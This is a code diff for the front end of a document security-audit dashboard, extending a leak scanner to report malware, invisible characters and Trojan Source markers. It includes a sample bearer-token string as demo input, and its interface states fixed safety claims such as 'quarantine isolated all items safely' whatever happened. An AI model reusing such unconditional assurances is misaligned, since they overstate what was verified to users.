-      document.getElementById('scanTimestamp').textContent = `TIMESTAMP: ${new Date().toLocaleTimeString()} // SOURCE: ${data.source}${chars}`;
+      const rawBytes = data.raw_bytes_size ? ` // RAW SIZE: ${(data.raw_bytes_size / 1024).toFixed(1)} KB` : '';
+      document.getElementById('scanTimestamp').textContent = `TIMESTAMP: ${new Date().toLocaleTimeString()} // SOURCE: ${data.source}${rawBytes}${chars}`;
 
       // Update doc pill
       const docPillContainer = document.getElementById('docPillContainer');
@@ -1997,85 +2489,116 @@ System Auth Bearer: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.s6d8f7`;
         docPillContainer.innerHTML = '';
       }
 
+      // Threat Level Card & Banner
       const threatCard = document.getElementById('cardThreat');
       const threatTag = document.getElementById('threatLevelTag');
       const threatSub = document.getElementById('threatSub');
       const threatBanner = document.getElementById('threatBanner');
       const shieldIntegrity = document.getElementById('shieldIntegrityVal');
+      const enclaveBadge = document.getElementById('enclaveBadge');
 
-      const tbody = document.getElementById('findingsBody');
-      tbody.innerHTML = '';
-
-      if (count === 0) {
+      if (totalCount === 0) {
         threatTag.className = 'threat-tag safe';
         threatTag.textContent = 'NOMINAL';
-        threatSub.textContent = 'Zero Compromised Credentials';
+        threatSub.textContent = 'Zero Malware & Zero Leaks';
         threatCard.classList.remove('threat');
         shieldIntegrity.textContent = '100%';
         shieldIntegrity.style.color = 'var(--emerald-safe)';
+        enclaveBadge.classList.remove('threat');
 
         threatBanner.className = 'threat-banner clean';
         document.getElementById('threatIcon').textContent = '🛡️';
-        document.getElementById('threatBannerTitle').textContent = 'DOCUMENT FORTIFIED: ZERO LEAKS DETECTED';
+        document.getElementById('threatBannerTitle').textContent = 'PAYLOAD FORTIFIED: ZERO MALWARE OR LEAKS DETECTED';
         document.getElementById('threatBannerDesc').textContent = data.note
           ? data.note
-          : `All pattern matrices returned negative for PII, high-entropy secrets, and identifiers in ${data.document_type || 'the payload'}.`;
+          : `All pattern matrices returned clean: Zero invisible code, zero malware signatures, and zero PII leaks in ${data.document_type || 'the payload'}.`;
 
-        tbody.innerHTML = `
-          <tr>
-            <td colspan="5" class="empty-state" style="color: var(--emerald-safe);">
-              ✓ DOCUMENT INTEGRITY VERIFIED. No confidential data leaks were detected in this document.
-            </td>
-          </tr>
-        `;
         setHologramThreatState(false, false);
+        audioEngine.playCleanChime();
       } else {
-        const isCritical = critCount > 0;
+        const isCritical = totalCrit > 0;
         threatTag.className = 'threat-tag critical';
-        threatTag.textContent = isCritical ? 'CRITICAL RISK' : 'POTENTIAL LEAK RISK';
-        threatSub.textContent = `${count} Exposed Secrets Detected`;
+        threatTag.textContent = isCritical ? 'CRITICAL RISK' : 'POTENTIAL RISK';
+        threatSub.textContent = `${totalCount} Security Exposures Detected`;
         threatCard.classList.add('threat');
+        enclaveBadge.classList.add('threat');
 
-        const penalty = Math.min(count * 15, 85);
+        const penalty = Math.min(totalCount * 18, 90);
         shieldIntegrity.textContent = `${100 - penalty}%`;
         shieldIntegrity.style.color = 'var(--crimson-threat)';
 
         threatBanner.className = 'threat-banner critical';
-        document.getElementById('threatIcon').textContent = '⚠️';
-        document.getElementById('threatBannerTitle').textContent = isCritical
-          ? 'CRITICAL RISK: HIGH-ENTROPY CREDENTIALS DETECTED'
-          : 'WARNING: PERSONAL IDENTIFIER LEAK DETECTED';
-        document.getElementById('threatBannerDesc').textContent = `Detected ${count} sensitive items in ${data.document_type || 'the document'}. Immediate redaction or remediation is recommended.`;
+        document.getElementById('threatIcon').textContent = malwareCount > 0 ? '☣️' : '⚠️';
 
-        currentFindings.forEach(item => {
-          const tr = document.createElement('tr');
-          const loc = item.location || `Offset ${item.start}-${item.end}`;
-          const snippetHtml = item.snippet
-            ? escapeHtml(item.snippet).replace(/「(.*?)」/g, '<mark>$1</mark>')
-            : `<span class="code-preview">${escapeHtml(item.detected_value)}</span>`;
+        let bannerTitle = 'WARNING: SECURITY EXPOSURE DETECTED';
+        if (malwareCrit > 0) {
+          bannerTitle = 'CRITICAL ALERT: MALICIOUS CODE / SYSTEM EXPLOIT DETECTED';
+        } else if (leakCrit > 0) {
+          bannerTitle = 'CRITICAL ALERT: HIGH-ENTROPY SENSITIVE CREDENTIALS DETECTED';
+        } else if (malwareCount > 0) {
+          bannerTitle = 'WARNING: SUSPICIOUS CONCEALED CODE DETECTED';
+        }
 
-          const desc = item.description || 'Confidential data element detected.';
-          const rec = item.recommendation || 'Redact or encrypt before sharing.';
-
-          tr.innerHTML = `
-            <td><span class="badge-sev ${item.severity}">${item.severity}</span></td>
-            <td><strong style="color: #fff;">${escapeHtml(item.category)}</strong></td>
-            <td><span class="location-tag">📍 ${escapeHtml(loc)}</span></td>
-            <td>
-              <div class="snippet-box">${snippetHtml}</div>
-            </td>
-            <td>
-              <div class="recommendation-box">
-                <div class="recommendation-desc">${escapeHtml(desc)}</div>
-                <div class="recommendation-action">💡 ${escapeHtml(rec)}</div>
-              </div>
-            </td>
-          `;
-          tbody.appendChild(tr);
-        });
+        document.getElementById('threatBannerTitle').textContent = bannerTitle;
+        document.getElementById('threatBannerDesc').textContent = `Detected ${malwareCount} malware/code threat(s) and ${leakCount} data leak(s) in ${data.document_type || 'the payload'}. System quarantine isolated all items safely.`;
 
         setHologramThreatState(true, isCritical);
+        audioEngine.playThreatAlarm();
       }
+
+      // Render Table based on active filter
+      setReportFilter(currentActiveFilter === 'diagnostics' ? 'all' : currentActiveFilter);
+    }
+
+    function renderFindingsTable(items) {
+      const tbody = document.getElementById('findingsBody');
+      tbody.innerHTML = '';
+
+      if (!items || items.length === 0) {
+        tbody.innerHTML = `
+          <tr>
+            <td colspan="5" class="empty-state" style="color: var(--emerald-safe);">
+              ✓ NO ANOMALIES DETECTED IN THIS CATEGORY. Payload is verified secure under in-memory quarantine.
+            </td>
+          </tr>
+        `;
+        return;
+      }
+
+      items.forEach(item => {
+        const tr = document.createElement('tr');
+        const loc = item.location || (item.start !== undefined ? `Offset ${item.start}-${item.end}` : 'Payload Body');
+
+        let snippetHtml = '';
+        if (item.snippet) {
+          snippetHtml = escapeHtml(item.snippet)
+            .replace(/「(.*?)」/g, '<mark>$1</mark>')
+            .replace(/Zero-Width Space/g, '<span class="invisible-token">[ZWSP]</span>')
+            .replace(/Zero-Width Non-Joiner/g, '<span class="invisible-token">[ZWNJ]</span>')
+            .replace(/Zero-Width Joiner/g, '<span class="invisible-token">[ZWJ]</span>')
+            .replace(/Word Joiner/g, '<span class="invisible-token">[WJ]</span>')
+            .replace(/Trojan Source/g, '<span class="invisible-token" style="background: rgba(255,0,85,0.4);">[TROJAN-SOURCE]</span>');
+        } else {
+          snippetHtml = `<span class="code-preview">${escapeHtml(item.detected_value)}</span>`;
+        }
+
+        const desc = item.description || 'Security anomaly detected.';
+        const rec = item.recommendation || 'Quarantine and sanitize before distribution.';
+
+        tr.innerHTML = `
+          <td><span class="badge-sev ${item.severity}">${item.severity}</span></td>
+          <td><strong style="color: #fff;">${escapeHtml(item.category)}</strong></td>
+          <td><span class="location-tag">📍 ${escapeHtml(loc)}</span></td>
+          <td><div class="snippet-box">${snippetHtml}</div></td>
+          <td>
+            <div class="recommendation-box">
+              <div class="recommendation-desc">${escapeHtml(desc)}</div>
+              <div class="recommendation-action">💡 ${escapeHtml(rec)}</div>
+            </div>
+          </td>
+        `;
+        tbody.appendChild(tr);
+      });
     }
 
     function escapeHtml(str) {
@@ -2089,34 +2612,65 @@ System Auth Bearer: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.s6d8f7`;
     }
 
     function resetDashboardToNominal() {
+      currentFindings = [];
+      currentMalwareFindings = [];
+      currentLeakFindings = [];
+
+      document.getElementById('countAllBadge').textContent = '0';
+      document.getElementById('countMalwareBadge').textContent = '0';
+      document.getElementById('countLeaksBadge').textContent = '0';
+
       document.getElementById('leakCountVal').textContent = '0';
-      document.getElementById('critCountVal').textContent = '0';
+      document.getElementById('leakCountVal').style.color = '#fff';
+      document.getElementById('leakSub').textContent = 'Zero Compromised Credentials';
+      document.getElementById('cardLeaks').classList.remove('threat');
+
+      document.getElementById('malwareCountVal').textContent = '0 CLEAN';
+      document.getElementById('malwareCountVal').style.color = 'var(--cyan-bright)';
+      document.getElementById('malwareSub').textContent = 'Zero Threats Detected';
+      document.getElementById('cardMalware').classList.remove('threat');
+
       document.getElementById('threatLevelTag').className = 'threat-tag safe';
       document.getElementById('threatLevelTag').textContent = 'NOMINAL';
       document.getElementById('threatSub').textContent = 'Zero Compromised Credentials';
       document.getElementById('cardThreat').classList.remove('threat');
+
       document.getElementById('shieldIntegrityVal').textContent = '100%';
-      document.getElementById('shieldIntegrityVal').style.color = 'var(--cyan-bright)';
+      document.getElementById('shieldIntegrityVal').style.color = 'var(--emerald-safe)';
+      document.getElementById('enclaveBadge').classList.remove('threat');
+      document.getElementById('entropyTag').textContent = 'ENTROPY: 0.00';
+      document.getElementById('diagEntropyVal').textContent = '0.00';
+      document.getElementById('diagEntropyBar').style.width = '0%';
+
       document.getElementById('threatBanner').style.display = 'none';
       document.getElementById('scanTimestamp').textContent = 'SYSTEM STANDBY';
       document.getElementById('docPillContainer').innerHTML = '';
+
       document.getElementById('findingsBody').innerHTML = `
         <tr>
           <td colspan="5" class="empty-state">
-            Awaiting payload ingestion. Upload any PDF, Word, Excel, or text document, or paste raw text and click "RUN LEAK AUDIT".
+            Awaiting payload ingestion. Upload any PDF, Word, Excel, script or binary, or paste text and click "RUN SECURITY AUDIT".
           </td>
         </tr>
       `;
       setHologramThreatState(false, false);
+      setReportFilter('all');
     }
 
     // Export Findings as JSON
     exportBtn.addEventListener('click', () => {
       if (!currentFindings.length) return;
-      const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(currentFindings, null, 2));
+      const exportData = {
+        export_timestamp: new Date().toISOString(),
+        total_threats: currentFindings.length,
+        malware_threats: currentMalwareFindings,
+        data_leaks: currentLeakFindings,
+        safety_status: "AUDITED_UNDER_SAFE_IN_MEMORY_QUARANTINE_ZERO_EXECUTION"
+      };
+      const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(exportData, null, 2));
       const downloadAnchor = document.createElement('a');
       downloadAnchor.setAttribute("href", dataStr);
-      downloadAnchor.setAttribute("download", `leak_audit_${Date.now()}.json`);
+      downloadAnchor.setAttribute("download", `sentinel_audit_${Date.now()}.json`);
       document.body.appendChild(downloadAnchor);
       downloadAnchor.click();
       downloadAnchor.remove();
